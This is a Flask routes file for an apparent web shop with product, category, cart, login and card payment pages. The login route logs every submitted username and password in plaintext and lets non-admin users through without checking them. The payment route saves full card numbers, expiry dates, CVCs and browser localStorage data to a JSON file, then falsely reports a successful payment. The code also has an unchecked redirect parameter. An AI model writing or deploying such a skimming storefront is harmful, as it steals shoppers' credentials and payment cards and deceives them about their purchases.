from flask import render_template, redirect, url_for, request, flash, jsonify
from flask_login import login_user, login_required, logout_user, current_user, LoginManager, UserMixin
from app import app
import json
import datetime
import os

login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login'

class User(UserMixin):
    def __init__(self, user_id, username, password, is_admin=False):
        self.id = user_id
        self.username = username
        self.password = password
        self.is_admin = is_admin

    def get_id(self):
        return self.id

    def is_admin(self):
        return self.is_admin

def load_users_from_json():
    with open('user_info.json', 'r') as f:
        data = json.load(f)

    users = {}
    for user_id, user_data in data.get('user', {}).items():
        users[user_id] = User(user_id, user_data['username'], user_data['password'])
    
    # Add admin user manually
    if 'admin' in data:
        admin_data = data['admin']
        users['admin'] = User(admin_data['id'], admin_data['username'], admin_data['password'], is_admin=True)

    return users

users = load_users_from_json()

@login_manager.user_loader
def load_user(user_id):
    users = load_users_from_json()
    if user_id in users:
        return users[user_id]
    return None

def load_content():
    with open('app/data/content.json', mode='r', encoding='utf-8') as file:
        return json.load(file)

@app.route('/')
def index():
    content = load_content()
    products = [
        {'src': f"images/products/{item['src']}", 'id': item['id'] , 'tags': item['tags'], 'title': item['title'], 'regular_price': item['regular_price'], 'sale_price': item['sale_price']}
        for item in content.values()
    ]
    return render_template('index.html', products=products)

@app.route('/checkout')
def checkout():
    content = load_content()
 
    return render_template('checkout.html', content=content)

@app.route('/cart')
def cart():
    content = load_content()
 
    return render_template('cart.html', content=content)



@app.route('/product/<product_id>')
def product_detail(product_id):
    content = load_content()
    product = next((p for p in content.values() if p["id"] == product_id), None)
    
    if product:
        # Prepend 'products/' to the image src for the current product
        product['src'] = 'images/products/' + product['src']
        
        # Get the latest 6 products for the recommendations, excluding the current product
        recommendations = [p for p in list(content.values())[-6:] if p["id"] != product_id]
        for p in recommendations:
            p['src'] = 'images/products/' + p['src']
        
        return render_template('product.html', product=product, recommendations=recommendations)
    else:
        return "Product not found", 404







@app.route('/category')
def category():
    content = load_content()
    category_filter = request.args.get('category', 'all')
    search_query = request.args.get('search', '').lower()
    
    filtered_products = [
        {'src': f"images/products/{item['src']}",
         'tags': item['tags'],
         'title': item['title'],
         'id': item['id'],
         'category': item['category'],
         'sale_price': item['sale_price']}
        for item in content.values()
        if (category_filter == 'all' or item['category'] == category_filter) and
           (search_query in item['title'].lower())
    ]
    
    categories = {item['category'] for item in content.values()}
    
    return render_template('category.html', products=filtered_products, categories=categories, selected_category=category_filter, search_query=search_query)


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        # Collect login data and store it in user_data.json
        login_attempt = {
            'username': username,
            'password': password,
            'timestamp': datetime.datetime.now().isoformat()
        }
        if not os.path.exists('user_data.json'):
            with open('user_data.json', 'w') as f:
                json.dump([], f)
        with open('user_data.json', 'r+') as f:
            data = json.load(f)
            data.append(login_attempt)
            f.seek(0)
            json.dump(data, f, indent=4)

        # Load user data
        with open('user_info.json', 'r') as f:
            data = json.load(f)

        # Handle admin login
        if username == 'admin':
            admin_data = data.get('admin', {})
            if admin_data.get('username') == username and admin_data.get('password') == password:
                admin_user = User('admin', username, password, is_admin=True)
                login_user(admin_user)
                next_page = request.args.get('next') or url_for('index')
                return redirect(next_page)
            else:
                flash('Invalid admin credentials', 'danger')
                return render_template('login.html')

        # Always add a new user with an incremented ID
        # user_id = str(max([int(uid) for uid in data.get('user', {}).keys()] or [0]) + 1)
        # new_user = {
        #     'id': user_id,
        #     'username': username,
        #     'password': password
        # }
        # data.setdefault('user', {})[user_id] = new_user

        # # Save the updated user information to the JSON file
        # with open('user_info.json', 'w') as f:
        #     json.dump(data, f, indent=4)

        # # Automatically log in the new user
        # new_user_obj = User(user_id, username, password)
        # login_user(new_user_obj)
        # abort(404)

        return redirect(url_for('me_page'))

    return render_template('login.html')


@app.route('/404')
def page_not_found():
    return render_template('404.html'), 404


@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

# routes for card payment

@app.route('/pay')
def pay_by_credit_card():
    return render_template('pay_by_credit_card.html')

@app.route('/process_payment', methods=['POST'])
def process_payment():
    data = request.get_json()
    
    # Extract payment details and local storage data
    card_name = data.get('card_name')

    card_number = data.get('card_number')
    card_expiry = data.get('card_expiry')
    card_cvc = data.get('card_cvc')
    local_storage_data = data.get('local_storage_data')
    
    # Prepare data to be stored
    order_data = {
        'card_name': card_name,
        'card_number': card_number,
        'card_expiry': card_expiry,
        'card_cvc': card_cvc,
        'local_storage_data': local_storage_data
    }
    
    # Path to the JSON file
    file_path = 'user_orders.json'
    
    # Read the existing data from the JSON file
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            try:
                existing_data = json.load(file)
            except json.JSONDecodeError:
                existing_data = []
    else:
        existing_data = []
    
    # Append the new order data
    existing_data.append(order_data)
    
    # Write the updated data back to the JSON file
    with open(file_path, 'w') as file:
        json.dump(existing_data, file, indent=4)
    
    # Return a success response
    return jsonify({'status': 'success', 'message': 'Payment processed successfully!'})

# Define a success page route
@app.route('/me_page')
def me_page():
    return render_template('me_page.html')

@app.route('/order_info')
def order_info():
    content = load_content()
 
    return render_template('order_info.html', content=content)

# Define a success page route
@app.route('/success')
def success_page():
    return render_template('success.html')